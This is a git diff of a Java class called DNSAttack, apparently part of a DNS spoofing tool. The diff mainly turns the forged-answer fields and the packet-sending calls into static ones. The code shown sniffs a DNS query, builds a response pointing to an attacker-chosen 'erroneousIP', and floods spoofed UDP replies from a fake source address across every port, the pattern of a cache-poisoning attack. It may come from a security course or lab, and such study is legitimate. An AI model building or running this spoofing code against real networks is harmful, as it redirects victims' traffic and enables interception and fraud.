@@ -9,18 +9,18 @@ import java.util.ArrayList;
 public class DNSAttack {
     private static final int dnsPort = 53;
     private static final int numPorts = 65536;
-    private String answerFlags = "8180";
-    private String answerNumQuestions = "0001";
-    private String answerNumAnswers = "0001";
-    private String answerNumAuthorityRecords = "0000";
-    private String answerNumAdditionalRecords = "0000";
-    private byte[] headerWithoutId = Utils.hexStringToByteArray(answerFlags + answerNumQuestions + answerNumAnswers + answerNumAuthorityRecords + answerNumAdditionalRecords);
-    private String answer_name = "c00c";
-    private String answer_type = "0001";
-    private String answer_class = "0001";
-    private byte[] answerSectionBegin = Utils.hexStringToByteArray(answer_name + answer_type + answer_class);
-    private byte[] answerSectionTTL = Utils.hexStringToByteArray("0000000a");
-    private byte[] answerSectionIpLength = Utils.hexStringToByteArray("0004");
+    private static String answerFlags = "8180";
+    private static String answerNumQuestions = "0001";
+    private static String answerNumAnswers = "0001";
+    private static String answerNumAuthorityRecords = "0000";
+    private static String answerNumAdditionalRecords = "0000";
+    private static byte[] headerWithoutId = Utils.hexStringToByteArray(answerFlags + answerNumQuestions + answerNumAnswers + answerNumAuthorityRecords + answerNumAdditionalRecords);
+    private static String answer_name = "c00c";
+    private static String answer_type = "0001";
+    private static String answer_class = "0001";
+    private static byte[] answerSectionBegin = Utils.hexStringToByteArray(answer_name + answer_type + answer_class);
+    private static byte[] answerSectionTTL = Utils.hexStringToByteArray("0000000a");
+    private static byte[] answerSectionIpLength = Utils.hexStringToByteArray("0004");
 
     public void showDNSQuery(byte[] dnsQuery) {
         System.out.println("ID: " + Utils.byteArrayToHexString(Utils.getPartOfByteArray(dnsQuery, 0, 1)));
@@ -71,13 +71,13 @@ public class DNSAttack {
             ArrayList<Packet> packets = sniffer.sniff(1);
             System.out.println(packets.get(0));
             UDPPacketData udpPacketData = new UDPPacketData(packets.get(0));
-            UDPSocket udpSocket = new UDPSocket(udpPacketData.getReceiverPort());
+            //UDPSocket udpSocket = new UDPSocket(udpPacketData.getReceiverPort());
             byte[] answer = generateDNSAnswer(packets.get(0).data, erroneousIP);
             long loopStopMillis = System.currentTimeMillis() + timeoutMillis;
             while (System.currentTimeMillis() < loopStopMillis)
                 //udpSocket.sendUDPPacket(udpPacketData.getSenderIP(), udpPacketData.getSenderPort(), answer);
-                udpSocket.SendUDPPacketNative(udpPacketData.getReceiverIP(), udpPacketData.getReceiverPort(), udpPacketData.getSenderIP(), udpPacketData.getSenderPort(), answer);
-            udpSocket.close();
+                UDPSocket.SendUDPPacketNative(udpPacketData.getReceiverIP(), udpPacketData.getReceiverPort(), udpPacketData.getSenderIP(), udpPacketData.getSenderPort(), answer);
+            //udpSocket.close();
         } catch (IOException e) {
             e.printStackTrace();
         }
@@ -102,7 +102,7 @@ public class DNSAttack {
                     final int lastPort = Math.min(assignedPorts + portsByCore, numPorts) - 1;
                     //new Thread(() -> {
                     for (int port = firstPort; port <= lastPort; port++) {
-                        udpSocket.SendUDPPacketNative(fakeSourceIP, dnsPort, dnsQueryPacket.getAddress().getHostAddress(), dnsQueryPacket.getPort(), answer);
+                        UDPSocket.SendUDPPacketNative(fakeSourceIP, dnsPort, dnsQueryPacket.getAddress().getHostAddress(), dnsQueryPacket.getPort(), answer);
                         /*try {
                             udpSocket.sendUDPPacket(dnsQueryPacket.getAddress().getHostAddress(), dnsQueryPacket.getPort(), answer);
                         } catch (IOException e) {
